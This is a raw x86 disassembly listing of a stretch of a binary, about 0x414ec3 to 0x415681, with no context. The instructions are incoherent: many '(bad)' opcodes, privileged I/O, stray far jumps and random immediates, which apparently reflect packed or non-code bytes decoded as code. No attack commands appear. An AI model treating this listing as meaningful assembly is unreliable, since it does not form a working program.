  414ec3:	mov    al,ds:0x6972ec99
  414ec9:	xchg   esp,eax
  414eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ecb:	aad    0x79
  414ecd:	jne    0x414f1f
  414ecf:	lods   al,BYTE PTR ds:[esi]
  414ed0:	xor    esp,DWORD PTR [eax+0x7b]
  414ed3:	bound  ecx,QWORD PTR [ebx]
  414ed5:	mov    ecx,0xf3226312
  414eda:	ss jno 0x414e6e
  414edd:	mov    ah,0x99
  414edf:	lods   al,BYTE PTR ds:[esi]
  414ee0:	(bad)  
  414ee1:	hlt    
  414ee2:	sub    BYTE PTR [edi+0x296360f6],bh
  414ee8:	je     0x414eb1
  414eea:	(bad)  
  414eeb:	dec    esp
  414eec:	cli    
  414eed:	cdq    
  414eee:	inc    edx
  414eef:	adc    al,BYTE PTR [ecx-0x2063de11]
  414ef5:	xor    al,0xcb
  414ef7:	cdq    
  414ef8:	cs out dx,eax
  414efa:	aaa    
  414efb:	arpl   WORD PTR [ebp+0x50699e42],ax
  414f01:	xchg   ebx,eax
  414f02:	fistp  DWORD PTR [eiz*2+0x55342b77]
  414f09:	inc    esp
  414f0a:	or     DWORD PTR [ecx-0x525c6c57],esi
  414f10:	mov    ecx,0x61e8b9d9
  414f15:	sbb    al,0xd1
  414f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f18:	ja     0x414eb4
  414f1a:	cli    
  414f1b:	in     al,dx
  414f1c:	dec    ebx
  414f1d:	sub    dl,bl
  414f1f:	jno    0x414f32
  414f21:	js     0x414eff
  414f23:	add    BYTE PTR [edi+ebx*1-0xacd4a01],cl
  414f2a:	cdq    
  414f2b:	(bad)  
  414f2c:	push   ebp
  414f2d:	daa    
  414f2e:	(bad)  
  414f30:	test   eax,0x6748f06
  414f35:	inc    ecx
  414f36:	jmp    0x6c117513
  414f3b:	inc    BYTE PTR [ecx+0x5623c46c]
  414f41:	add    ecx,ebx
  414f43:	repz in eax,dx
  414f45:	je     0x414f46
  414f47:	idiv   DWORD PTR [ecx-0x684ad329]
  414f4d:	repz fld TBYTE PTR [eax]
  414f50:	xlat   BYTE PTR ds:[ebx]
  414f51:	int3   
  414f52:	dec    ebx
  414f53:	ret    
  414f54:	sbb    bl,BYTE PTR [ebp-0x7b]
  414f57:	cmp    al,0x99
  414f59:	mov    eax,ds:0x84dd3eea
  414f5e:	maxps  xmm7,XMMWORD PTR [esi]
  414f61:	out    0xf9,al
  414f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f64:	icebp  
  414f65:	repnz int 0x7a
  414f68:	pop    edx
  414f69:	mov    esi,0xea357b7d
  414f6e:	loopne 0x414f77
  414f70:	loope  0x414ff1
  414f72:	pop    esp
  414f73:	loop   0x414f31
  414f75:	das    
  414f76:	lock test DWORD PTR [eax+0x2e],0xe3902a37
  414f7e:	jecxz  0x414f79
  414f80:	test   al,0x2a
  414f82:	inc    ecx
  414f84:	arpl   WORD PTR [edi-0x12],bx
  414f87:	mov    dh,0x30
  414f89:	and    eax,0x486dada6
  414f8e:	sar    BYTE PTR [esi+0x5b],0xd5
  414f92:	loopne 0x414f16
  414f94:	cli    
  414f95:	std    
  414f96:	out    dx,al
  414f97:	dec    eax
  414f98:	mov    esp,0xf4f5ffc2
  414f9d:	out    dx,eax
  414f9e:	adc    BYTE PTR [edi+0x0],dl
  414fa1:	arpl   si,dx
  414fa3:	aas    
  414fa4:	loopne 0x414f32
  414fa6:	push   cs
  414fa7:	dec    ebx
  414fa8:	inc    esp
  414fa9:	xchg   ecx,eax
  414faa:	outs   dx,BYTE PTR ds:[esi]
  414fab:	cwde   
  414fac:	mov    BYTE PTR [esi+0x7d371411],ah
  414fb2:	call   0x61f9:0x4cdd8b63
  414fb9:	inc    esp
  414fba:	ins    BYTE PTR es:[edi],dx
  414fbb:	mov    bh,bh
  414fbd:	and    BYTE PTR [ecx+0x97985bd],bh
  414fc3:	fist   DWORD PTR [ebx+0x60d564c9]
  414fc9:	(bad)  
  414fca:	push   ds
  414fcb:	mov    eax,ecx
  414fcd:	in     eax,dx
  414fce:	xchg   edi,eax
  414fcf:	or     al,0x60
  414fd1:	sub    BYTE PTR [esi+eax*8],dl
  414fd4:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  414fd6:	mov    ebp,0x1e30a319
  414fdb:	mov    BYTE PTR [edi+edx*2-0x42],0xc2
  414fe0:	iret   
  414fe1:	aas    
  414fe2:	rcr    BYTE PTR [ecx-0x4bfb1234],1
  414fe8:	inc    ecx
  414fe9:	or     eax,0xea9627a9
  414fee:	pushf  
  414fef:	or     edx,edi
  414ff1:	mov    dh,0xab
  414ff3:	sbb    ebp,ecx
  414ff5:	xchg   edi,eax
  414ff6:	push   eax
  414ff7:	dec    ecx
  414ff8:	idiv   DWORD PTR [ecx+0x2d]
  414ffb:	nop
  414ffc:	dec    edx
  414ffd:	fstp   TBYTE PTR [esi+ebp*8]
  415000:	mov    ds:0xf5d05b9d,al
  415005:	mov    eax,edi
  415007:	stos   DWORD PTR es:[edi],eax
  415008:	mov    DWORD PTR [esi-0x15b7056d],0xfb570b5
  415012:	mov    ss,ecx
  415014:	dec    esi
  415015:	mov    edi,0xc45ed462
  41501a:	(bad)  
  41501c:	xchg   esi,eax
  41501d:	xor    ah,dh
  41501f:	(bad)  [esi]
  415021:	sbb    DWORD PTR [esi-0xd1ab567],eax
  415027:	add    BYTE PTR [edx-0x27],cl
  41502a:	into   
  41502b:	jno    0x415021
  41502d:	dec    eax
  41502e:	cli    
  41502f:	pop    esp
  415030:	cmp    cl,bl
  415032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415033:	pushf  
  415034:	repz inc BYTE PTR [ecx+0x2b]
  415038:	sub    dl,BYTE PTR [eax+0x6b]
  41503b:	ss ret 0xce20
  41503f:	cli    
  415040:	xlat   BYTE PTR ds:[ebx]
  415041:	out    dx,al
  415042:	jecxz  0x41507d
  415044:	cmp    dh,0xbe
  415047:	es pop edi
  415049:	dec    ecx
  41504a:	pop    esi
  41504b:	mov    dl,0x61
  41504d:	dec    esp
  41504e:	ret    0x3024
  415051:	dec    ecx
  415052:	shl    BYTE PTR [edx+0x58],0x2d
  415056:	xchg   DWORD PTR [eax+0x34e32649],esi
  41505c:	dec    ebp
  41505d:	xchg   esi,eax
  41505e:	push   0x4167dfe4
  415063:	xchg   ebx,eax
  415064:	add    ebx,DWORD PTR [eax]
  415066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415067:	scas   al,BYTE PTR es:[edi]
  415068:	push   es
  415069:	aas    
  41506a:	push   edi
  41506b:	inc    edi
  41506c:	lods   eax,DWORD PTR ds:[esi]
  41506d:	inc    esp
  41506e:	shr    eax,0x5c
  415071:	repz inc BYTE PTR [edx+0x6a]
  415075:	out    0x1e,al
  415077:	scas   al,BYTE PTR es:[edi]
  415078:	pushf  
  415079:	jbe    0x415008
  41507b:	int    0xb1
  41507d:	aad    0xbc
  41507f:	fstp   DWORD PTR [ebx]
  415081:	shl    ebp,cl
  415083:	dec    esp
  415084:	mov    ds:0xd1aecba4,al
  415089:	stos   DWORD PTR es:[edi],eax
  41508a:	inc    edi
  41508b:	bound  ebp,QWORD PTR [eax+0x13]
  41508e:	shl    DWORD PTR [edi+0x2e],1
  415091:	mov    DWORD PTR [edi+eiz*8-0x34],esp
  415095:	jl     0x4150bb
  415097:	pop    ds
  415098:	and    ch,ch
  41509a:	retf   0xb0f1
  41509d:	mov    edx,0xeb7e8628
  4150a2:	hlt    
  4150a3:	test   DWORD PTR [edi+0x1a1776fe],0x37d52c4a
  4150ad:	jae    0x4150a6
  4150af:	mov    cl,0x3a
  4150b1:	ret    0x552e
  4150b4:	mov    ?,WORD PTR ds:0x72dfb8e3
  4150ba:	inc    ecx
  4150bb:	jmp    DWORD PTR [edi+0xf2cfb03]
  4150c1:	pop    ecx
  4150c2:	push   0x3d
  4150c4:	mov    ebp,0x91cba879
  4150c9:	xchg   edi,eax
  4150ca:	sub    BYTE PTR [ebp-0x57],dl
  4150cd:	jmp    0x41511f
  4150cf:	push   es
  4150d0:	fiadd  WORD PTR fs:[eax]
  4150d3:	sbb    al,0x66
  4150d5:	sbb    eax,0x83b87971
  4150da:	cmp    cl,BYTE PTR [ebx-0x3579bbb4]
  4150e0:	xor    al,0xd5
  4150e2:	daa    
  4150e3:	cmp    ah,dl
  4150e5:	mov    esi,0x190140a3
  4150ea:	(bad)  
  4150eb:	(bad)  
  4150ec:	daa    
  4150ed:	test   cl,al
  4150ef:	pop    ss
  4150f0:	pusha  
  4150f1:	mov    ss,WORD PTR [edi]
  4150f3:	xchg   BYTE PTR [ecx+0x26],bh
  4150f6:	push   esi
  4150f7:	fisttp DWORD PTR [ecx-0x57]
  4150fa:	push   eax
  4150fb:	xor    al,0x78
  4150fd:	xchg   edi,eax
  4150fe:	mov    edx,0x6af7890b
  415103:	adc    ch,0x4f
  415106:	aaa    
  415107:	pop    ds
  415108:	cmc    
  415109:	repz xchg edi,eax
  41510b:	push   edi
  41510c:	mov    eax,ds:0xca552a35
  415111:	jl     0x415151
  415113:	mov    bh,0x58
  415115:	or     dh,BYTE PTR [eax+0x56]
  415118:	int3   
  415119:	jge    0x41515b
  41511b:	fisubr WORD PTR [ecx-0x21]
  41511e:	jbe    0x4150c2
  415120:	inc    esi
  415121:	adc    DWORD PTR [ecx],0xb1e26be4
  415127:	cmp    al,0xf7
  415129:	mov    al,ds:0xa9de7871
  41512e:	sbb    bl,BYTE PTR [ebx-0x22]
  415131:	pop    ebp
  415132:	push   ebp
  415133:	xor    BYTE PTR [edi+0x5359d7b0],0xfa
  41513a:	push   ebp
  41513b:	outs   dx,BYTE PTR ds:[esi]
  41513c:	mov    edx,0x7b8f5d7
  415141:	dec    edi
  415142:	aad    0xdf
  415144:	cmp    bh,ah
  415146:	test   DWORD PTR [edx],esp
  415148:	inc    ebp
  415149:	jne    0x4151a0
  41514b:	test   al,0xe7
  41514d:	push   0x63
  41514f:	into   
  415150:	imul   eax,DWORD PTR [eax],0x8d76b5
  415156:	inc    esi
  415157:	push   eax
  415158:	mov    cl,0x99
  41515a:	mov    ch,0x1e
  41515c:	lods   al,BYTE PTR ds:[esi]
  41515d:	xchg   ecx,eax
  41515e:	ins    DWORD PTR es:[edi],dx
  41515f:	and    DWORD PTR [ebx],0xe
  415162:	mov    esi,0x6f1f3601
  415167:	imul   BYTE PTR [eax+0x3]
  41516a:	in     al,0x9e
  41516c:	jl     0x4151e0
  41516e:	pusha  
  41516f:	fs (bad) 
  415171:	jecxz  0x415193
  415173:	cmc    
  415174:	jns    0x41514d
  415176:	pushf  
  415177:	push   cs
  415178:	pop    ecx
  415179:	xchg   esp,eax
  41517a:	cmp    al,0x8
  41517c:	loopne 0x41515e
  41517e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41517f:	in     eax,0xdc
  415181:	stc    
  415182:	imul   eax,ebx,0x56bb2712
  415188:	sbb    dl,bh
  41518a:	imul   edi,DWORD PTR [ebx-0x44],0xffffffcf
  41518e:	and    cl,BYTE PTR ds:0x80b0298a
  415194:	jl     0x4151a4
  415196:	jb     0x415173
  415198:	fsub   QWORD PTR [ebx]
  41519a:	fild   QWORD PTR [esi]
  41519c:	sub    esp,ebx
  41519e:	test   DWORD PTR [ebp-0x4a67dbf5],ecx
  4151a4:	mov    ah,0x72
  4151a6:	pop    esi
  4151a7:	cmc    
  4151a8:	cmp    cl,BYTE PTR cs:[eax-0x6e9a1f93]
  4151af:	pop    ebx
  4151b0:	pop    ebx
  4151b1:	ins    DWORD PTR es:[edi],dx
  4151b2:	fiadd  DWORD PTR [eax]
  4151b4:	cmp    esp,DWORD PTR [ecx]
  4151b6:	test   al,0xd6
  4151b8:	jl     0x4151b5
  4151ba:	xor    eax,0x9db0e0a4
  4151bf:	lea    ebp,[eax]
  4151c1:	outs   dx,DWORD PTR ds:[esi]
  4151c2:	or     DWORD PTR [ebp-0x2b],eax
  4151c5:	pop    esi
  4151c6:	fbld   TBYTE PTR [edi-0x2f5f05b9]
  4151cc:	mov    al,ds:0x3b166601
  4151d1:	add    edi,DWORD PTR [ebx+0x7b]
  4151d4:	repnz idiv cl
  4151d7:	cmp    esp,DWORD PTR ds:0x4d90c85b
  4151dd:	aam    0x11
  4151df:	sub    DWORD PTR [eax-0x4ee82126],eax
  4151e5:	jb     0x41525c
  4151e7:	sub    DWORD PTR [ecx+0x8ea3824],esp
  4151ed:	mov    ah,0xd7
  4151ef:	dec    esi
  4151f0:	es lock cli 
  4151f3:	das    
  4151f4:	sub    BYTE PTR [ebp+ebx*4+0x33b59f52],ch
  4151fb:	cdq    
  4151fc:	sbb    BYTE PTR [esi+0x5309aed8],0x84
  415203:	add    DWORD PTR [ebp+0x4e],ebp
  415206:	jecxz  0x415277
  415208:	(bad)  
  415209:	aas    
  41520a:	out    dx,eax
  41520b:	mov    ds:0x4442318b,eax
  415210:	sar    DWORD PTR ds:[esi+eax*4-0x62],0xa2
  415216:	mov    DWORD PTR [esi+eax*2],ebp
  415219:	dec    ebp
  41521a:	bound  eax,QWORD PTR [edx]
  41521c:	mov    ecx,0x98030d31
  415221:	dec    esp
  415222:	fist   WORD PTR [edx+0x3fc5d4ec]
  415228:	call   0x84b5398d
  41522d:	dec    edx
  41522e:	aas    
  41522f:	mov    BYTE PTR [ebp+ebx*8+0x502f70f4],ah
  415236:	push   edi
  415237:	sti    
  415238:	test   BYTE PTR [ebp-0x74cc732f],cl
  41523e:	and    al,0x4c
  415240:	push   ds
  415241:	inc    esi
  415242:	mov    bl,0xd1
  415244:	in     al,dx
  415245:	aad    0xdd
  415247:	not    DWORD PTR [edi-0x33e9e425]
  41524d:	cmp    esi,DWORD PTR [edi]
  41524f:	aas    
  415250:	inc    esi
  415251:	(bad)  
  415252:	push   ebp
  415253:	dec    ebx
  415254:	stc    
  415255:	mov    ebx,0x13c1e7ba
  41525a:	and    ebp,esp
  41525c:	jmp    0x566:0x7f64872d
  415263:	mov    cl,0x2a
  415265:	dec    ebp
  415266:	xchg   ebx,eax
  415267:	jmp    0x415266
  415269:	retf   0xded5
  41526c:	mov    dh,0xea
  41526e:	jle    0x4152ee
  415270:	sahf   
  415271:	cmp    al,0x9d
  415273:	addr16 pop esi
  415275:	sbb    BYTE PTR [ebx-0x1e7f5695],ch
  41527b:	push   eax
  41527c:	fld    DWORD PTR [edi+ebp*8-0x78]
  415280:	cmp    dh,BYTE PTR [esi]
  415282:	sub    eax,0xab33e64e
  415287:	mov    eax,0xa85069c1
  41528c:	out    dx,eax
  41528d:	cld    
  41528e:	andnps xmm4,XMMWORD PTR [edi-0x9]
  415292:	inc    ecx
  415293:	jne    0x415274
  415295:	push   es
  415296:	fmul   DWORD PTR [ebx+0x1b]
  415299:	jmp    0xeea9:0xe42dee98
  4152a0:	stos   DWORD PTR es:[edi],eax
  4152a1:	inc    ebx
  4152a2:	add    eax,0x7ad7e210
  4152a7:	pusha  
  4152a8:	xchg   ebx,eax
  4152a9:	cmp    DWORD PTR [edx],esp
  4152ab:	aaa    
  4152ac:	sub    edx,DWORD PTR [esi+eax*2+0x778a11c5]
  4152b3:	mov    cl,0x23
  4152b5:	inc    edi
  4152b6:	mov    esp,0x7a0dfe2a
  4152bb:	mov    edi,0xcb0dc6ae
  4152c0:	cmp    eax,0x49b17d42
  4152c5:	sub    DWORD PTR [ebx+0x526b8b08],ebx
  4152cb:	inc    ecx
  4152cc:	fidiv  DWORD PTR [ebx]
  4152ce:	scas   al,BYTE PTR es:[edi]
  4152cf:	or     BYTE PTR [eax+0x5],bl
  4152d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d3:	jp     0x41533c
  4152d5:	dec    ecx
  4152d6:	mov    eax,0xeba16054
  4152db:	in     eax,dx
  4152dc:	and    DWORD PTR [edi],esp
  4152de:	mov    esp,0x835d8522
  4152e3:	stos   DWORD PTR es:[edi],eax
  4152e4:	push   edi
  4152e5:	stos   DWORD PTR es:[edi],eax
  4152e6:	shr    ebx,0xea
  4152e9:	push   0x11
  4152eb:	adc    eax,0xfff06ad9
  4152f0:	or     bl,cl
  4152f2:	or     BYTE PTR [ebx+0x4a],dl
  4152f5:	ins    DWORD PTR es:[edi],dx
  4152f6:	int3   
  4152f7:	cmp    edx,edx
  4152f9:	in     al,dx
  4152fa:	and    DWORD PTR [ebp+edi*4-0x47],esi
  4152fe:	pop    ds
  4152ff:	sbb    al,0x75
  415301:	pop    edx
  415302:	pusha  
  415303:	pop    esp
  415304:	mov    ecx,0xf220f29a
  415309:	xor    eax,DWORD PTR [eax+eax*4-0x5b]
  41530d:	inc    ecx
  41530e:	jge    0x41534b
  415310:	clc    
  415311:	gs leave 
  415313:	sbb    dh,al
  415315:	jmp    0x9f07cfe7
  41531a:	inc    ebx
  41531b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41531c:	jmp    0x4152dc
  41531e:	les    edx,FWORD PTR [edx-0x5de738a1]
  415324:	mov    bl,0x11
  415326:	inc    esp
  415327:	lods   al,BYTE PTR ds:[esi]
  415328:	mov    ebp,0x578efdb0
  41532d:	(bad)  
  41532e:	outs   dx,BYTE PTR ds:[esi]
  41532f:	aam    0x29
  415331:	mov    ds:0xdedfefaf,eax
  415336:	push   esp
  415337:	sbb    DWORD PTR [ebx-0x4b],esi
  41533a:	mov    eax,0xdbaa42b6
  41533f:	pop    es
  415340:	and    bl,bl
  415342:	push   eax
  415343:	mov    bh,ch
  415345:	sbb    al,0x46
  415347:	and    dh,ch
  415349:	mov    ecx,0x8fb28c21
  41534e:	adc    edi,DWORD PTR [edi]
  415350:	sub    ch,BYTE PTR [ecx+0x16cba6a7]
  415356:	sti    
  415357:	imul   ecx
  415359:	push   ebx
  41535a:	xchg   BYTE PTR [ebx],ah
  41535c:	jle    0x41534a
  41535e:	mov    esp,0x54133696
  415363:	pop    edi
  415364:	pop    ecx
  415365:	cdq    
  415366:	std    
  415367:	cmc    
  415368:	pop    ebp
  415369:	popf   
  41536a:	hlt    
  41536b:	mov    bh,0x96
  41536d:	retf   
  41536e:	mov    al,ds:0x7c860478
  415373:	out    0x75,eax
  415375:	push   ebx
  415376:	ret    0x88e3
  415379:	xor    ebp,DWORD PTR ds:0x7a8d7de
  41537f:	pop    ds
  415380:	push   edi
  415381:	aad    0x18
  415383:	cs mov bh,0xf1
  415386:	cld    
  415387:	cdq    
  415388:	and    eax,0x6e434477
  41538d:	mov    esp,0xb2b8bbd9
  415392:	fimul  DWORD PTR [ecx-0x3d]
  415395:	cmc    
  415396:	cmp    eax,0xf3c7c5dc
  41539b:	loopne 0x4153d0
  41539d:	mov    dl,0xc3
  41539f:	add    al,BYTE PTR [eax+eiz*8]
  4153a2:	cmp    al,0x59
  4153a4:	adc    dh,BYTE PTR [esp+edi*2]
  4153a7:	js     0x4153fd
  4153a9:	sub    esp,DWORD PTR [edi+ebp*8+0x45]
  4153ad:	arpl   WORD PTR [ebx+0x9],dx
  4153b0:	sbb    bl,bl
  4153b2:	jge    0x4153b8
  4153b4:	xor    eax,0xe47404fd
  4153b9:	mov    bl,0xde
  4153bb:	pop    es
  4153bc:	dec    ebp
  4153bd:	mov    ebx,0x2e92d7fa
  4153c2:	xchg   esp,eax
  4153c3:	enter  0x43b1,0x4d
  4153c7:	push   edi
  4153c8:	test   al,0x7a
  4153ca:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153cc:	dec    DWORD PTR [esi-0x148a2e9a]
  4153d2:	test   eax,0xc152e9a7
  4153d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153d8:	push   esi
  4153d9:	stos   DWORD PTR es:[edi],eax
  4153da:	adc    bl,BYTE PTR [eax+edi*2+0x1c9b5dce]
  4153e1:	lods   al,BYTE PTR ds:[esi]
  4153e2:	retf   
  4153e3:	jg     0x41542f
  4153e5:	sbb    ebx,DWORD PTR [esi+ecx*2+0x1a]
  4153e9:	pop    edx
  4153ea:	sti    
  4153eb:	cld    
  4153ec:	scas   al,BYTE PTR es:[edi]
  4153ed:	cmp    bl,BYTE PTR [esi+edx*4+0x25]
  4153f1:	xchg   esi,eax
  4153f2:	xor    eax,0x8b0a560
  4153f7:	rcl    BYTE PTR [esi+0x5b919c52],1
  4153fd:	jl     0x4153ac
  4153ff:	daa    
  415400:	mov    ecx,DWORD PTR [esi]
  415402:	adc    DWORD PTR [ecx],0x56
  415405:	leave  
  415406:	(bad)  
  415407:	call   0xb50509d5
  41540c:	cmp    esp,DWORD PTR ss:[edi-0x5b12b2fe]
  415413:	int3   
  415414:	jp     0x4153e3
  415416:	cli    
  415417:	xchg   edx,eax
  415418:	jo     0x4153e6
  41541a:	(bad)
  41541d:	add    al,0x18
  41541f:	dec    ebp
  415420:	pop    ebp
  415421:	add    BYTE PTR [edi+0x14],bl
  415424:	mov    ds:0xaf7954b6,al
  415429:	inc    ebp
  41542a:	mov    ebp,es
  41542c:	and    ecx,ecx
  41542e:	in     eax,dx
  41542f:	mov    cs,edx
  415431:	jp     0x41544d
  415433:	sbb    ah,BYTE PTR [ebp+0x236fe4a2]
  415439:	icebp  
  41543a:	test   DWORD PTR [edx+0x8e70593],ebx
  415440:	sbb    eax,0x8fcf9ccb
  415445:	in     eax,dx
  415446:	adc    DWORD PTR [ebx+0x21579c91],ecx
  41544c:	push   cs
  41544d:	mov    esp,edi
  41544f:	sub    eax,0xf11a55cf
  415454:	mov    esi,0xbce70338
  415459:	and    edx,DWORD PTR [edi+edx*8-0x52]
  41545d:	xchg   DWORD PTR [edi],ebx
  41545f:	mov    ebx,0xc27121f8
  415464:	xor    ebx,ebx
  415466:	inc    ebp
  415467:	popa   
  415468:	out    dx,al
  415469:	call   DWORD PTR [ecx-0x1b9f2cc4]
  41546f:	popf   
  415470:	aam    0x1a
  415472:	jecxz  0x4154e7
  415474:	sub    eax,0x6a42a041
  415479:	adc    al,0x1e
  41547b:	inc    esp
  41547c:	ins    BYTE PTR es:[edi],dx
  41547d:	jo     0x415453
  41547f:	adc    edi,DWORD PTR [edx]
  415481:	imul   ebp,DWORD PTR [eax-0x2d],0xfb2fdf40
  415488:	ror    eax,cl
  41548a:	(bad)  
  41548b:	or     BYTE PTR [eax],dl
  41548d:	mov    eax,ds:0x3c0aa6d0
  415492:	cmc    
  415493:	cmp    eax,0xb4e78182
  415498:	sbb    ah,bl
  41549a:	mov    dh,0xc2
  41549c:	adc    eax,0xc12025fd
  4154a1:	das    
  4154a2:	cmp    ebp,DWORD PTR [ecx-0x1ff44558]
  4154a8:	dec    esi
  4154a9:	xchg   edi,eax
  4154aa:	imul   ebp,DWORD PTR [eax-0x6c],0x21
  4154ae:	add    edi,eax
  4154b0:	cwde   
  4154b1:	xchg   ebp,eax
  4154b2:	mov    edi,0xba1decbe
  4154b7:	push   eax
  4154b8:	scas   al,BYTE PTR es:[edi]
  4154b9:	jbe    0x415464
  4154bb:	push   ds
  4154bc:	dec    ecx
  4154bd:	jg     0x41546a
  4154bf:	pop    ss
  4154c0:	push   esp
  4154c1:	fwait
  4154c2:	pop    ss
  4154c3:	inc    edi
  4154c4:	pop    ss
  4154c5:	mov    al,ds:0xd4b09bb
  4154ca:	cld    
  4154cb:	nop
  4154cc:	lods   eax,DWORD PTR ds:[esi]
  4154cd:	outs   dx,DWORD PTR ds:[esi]
  4154ce:	sbb    eax,0xecc07bda
  4154d3:	and    eax,0xb7441a94
  4154d8:	inc    ebp
  4154d9:	jecxz  0x41547e
  4154db:	retf   
  4154dc:	dec    esi
  4154dd:	(bad)
  4154e0:	not    BYTE PTR [ebx-0xd07ba89]
  4154e6:	das    
  4154e7:	mov    dl,0x68
  4154e9:	(bad)  
  4154ea:	cld    
  4154eb:	dec    esi
  4154ec:	test   DWORD PTR [esp+ecx*8-0x7a8a097],eax
  4154f3:	mov    al,BYTE PTR [eax-0x5a]
  4154f6:	jl     0x4154f3
  4154f8:	fldenv [esi+0x537a37e1]
  4154fe:	push   ecx
  4154ff:	(bad)  
  415500:	ds retf 
  415502:	add    al,0xa5
  415504:	mov    bl,0x1
  415506:	repnz and ah,BYTE PTR [ecx-0x47]
  41550a:	ror    dl,cl
  41550c:	cmp    al,0xd5
  41550e:	into   
  41550f:	and    dh,BYTE PTR [edi]
  415511:	leave  
  415512:	add    al,0x3e
  415514:	(bad)  
  415515:	shr    BYTE PTR [esi],1
  415517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415518:	jmp    0xc009c409
  41551d:	retf   0x70bb
  415520:	ja     0x4154ff
  415522:	xchg   esi,eax
  415523:	retf   0xf3ff
  415526:	test   al,0x74
  415528:	cmp    eax,0xf0d1c361
  41552d:	loopne 0x41557d
  41552f:	(bad)  
  415530:	push   ds
  415531:	in     al,dx
  415532:	aas    
  415533:	pop    ds
  415534:	push   edx
  415535:	push   0xffffffd4
  415537:	xchg   ebp,eax
  415538:	push   es
  415539:	in     al,dx
  41553a:	xlat   BYTE PTR ds:[ebx]
  41553b:	jge    0x415593
  41553d:	daa    
  41553e:	ins    DWORD PTR es:[edi],dx
  41553f:	add    bh,dh
  415541:	push   ebx
  415542:	arpl   cx,dx
  415544:	or     eax,0xb47deedd
  415549:	or     cl,BYTE PTR [ecx+ebp*8+0x21]
  41554d:	dec    ecx
  41554e:	out    0x84,eax
  415550:	inc    ecx
  415551:	xchg   edx,eax
  415552:	ins    BYTE PTR es:[edi],dx
  415553:	mov    edi,0x3c20436b
  415558:	cwde   
  415559:	stos   BYTE PTR es:[edi],al
  41555a:	sub    dh,BYTE PTR [ebx+0x4f1d06a8]
  415560:	push   0xffffffb0
  415562:	aad    0x96
  415564:	and    edx,DWORD PTR [edi+0x72]
  415567:	push   edi
  415568:	div    BYTE PTR [ebx]
  41556a:	and    esp,DWORD PTR ds:0x86e521b
  415570:	sbb    ah,BYTE PTR [ecx]
  415572:	sbb    BYTE PTR [esi-0x822fae2],ah
  415578:	call   0xd276:0x1682e81b
  41557f:	mov    dh,0x9a
  415581:	jno    0x41554e
  415583:	jns    0x41557a
  415585:	sbb    eax,DWORD PTR [esi-0x1e]
  415588:	mov    ebp,0x5ee8a471
  41558d:	cmp    bl,BYTE PTR [esi+0x63]
  415590:	add    esp,eax
  415592:	mov    ah,0x50
  415594:	mov    esi,0xec83961a
  415599:	ret    0xd774
  41559c:	pushf  
  41559d:	addr16 and eax,ecx
  4155a0:	push   ebx
  4155a1:	clc    
  4155a2:	(bad)  
  4155a3:	sub    DWORD PTR [ecx+0x23fadf0c],ebx
  4155a9:	mov    dl,0x23
  4155ab:	mov    ebp,0x9d938f32
  4155b0:	jg     0x41558e
  4155b2:	(bad)
  4155b6:	call   0x963b:0x3d68fffb
  4155bd:	fsub   DWORD PTR [esi+0x55274842]
  4155c3:	imul   ebp,ebp,0x63303be8
  4155c9:	mov    ebx,0xedab42a9
  4155ce:	jl     0x4155f8
  4155d0:	test   eax,0xeedf6a53
  4155d5:	mov    ebp,0x2617c385
  4155da:	outs   dx,BYTE PTR ds:[esi]
  4155db:	(bad)  
  4155dd:	js     0x4155f9
  4155df:	fldcw  WORD PTR [eax]
  4155e1:	shl    DWORD PTR [edx+0x2e],cl
  4155e4:	inc    esp
  4155e5:	sub    dl,BYTE PTR ds:0xb2e770f0
  4155eb:	adc    edi,DWORD PTR [edx]
  4155ed:	cmp    DWORD PTR [ecx],ebp
  4155ef:	cmp    al,0xd9
  4155f1:	mov    edx,0x740b3714
  4155f6:	or     ecx,esp
  4155f8:	xchg   ecx,eax
  4155f9:	repz daa 
  4155fb:	or     DWORD PTR [edi+edi*8-0xc5c3a3c],esi
  415602:	stos   BYTE PTR es:[edi],al
  415603:	pushf  
  415604:	sahf   
  415605:	pop    ebx
  415606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415607:	mov    ebp,0x43de771d
  41560c:	ds cmp al,0x4
  41560f:	adc    eax,DWORD PTR [ecx+eax*2+0x3c]
  415613:	xlat   BYTE PTR ds:[ebx]
  415614:	mov    DWORD PTR [edi-0x12],edx
  415617:	or     eax,0x77e8dc26
  41561c:	mul    DWORD PTR [ecx]
  41561e:	ins    BYTE PTR es:[edi],dx
  41561f:	inc    edi
  415620:	aaa    
  415621:	retf   0x9304
  415624:	mov    ch,0xc1
  415626:	out    dx,eax
  415627:	jne    0x41562f
  415629:	adc    ch,BYTE PTR [ecx+0x2e]
  41562c:	mov    ch,0x61
  41562e:	jmp    FWORD PTR [ecx]
  415630:	dec    ecx
  415631:	loope  0x4156ad
  415633:	lods   eax,DWORD PTR ds:[esi]
  415634:	pop    ss
  415635:	push   es
  415636:	cld    
  415637:	btc    DWORD PTR [edi],eax
  41563a:	sbb    eax,0x6bb78c60
  41563f:	call   0x287c81ee
  415644:	fnstsw WORD PTR [esp+ebp*8+0x67]
  415648:	in     al,dx
  415649:	push   edx
  41564a:	aad    0x8e
  41564c:	mov    gs,WORD PTR [edx+0x7a]
  41564f:	mov    ah,0xe5
  415651:	inc    esi
  415652:	jl     0x41565e
  415654:	call   0x5614ba8c
  415659:	out    0x4e,al
  41565b:	js     0x4155f6
  41565d:	aas    
  41565e:	clc    
  41565f:	jg     0x41562a
  415661:	pop    esi
  415662:	ins    BYTE PTR es:[edi],dx
  415663:	mov    esp,ecx
  415665:	jbe    0x41564f
  415667:	and    DWORD PTR [ebx],esi
  415669:	or     ah,BYTE PTR [edx-0xa1a0228]
  41566f:	inc    edx
  415670:	into   
  415671:	xor    eax,0xde097483
  415676:	ds adc al,0xd
  415679:	stos   BYTE PTR es:[edi],al
  41567a:	mov    WORD PTR [ebx-0x3619a4de],?
  415680:	das    
  415681:	dec    ebx
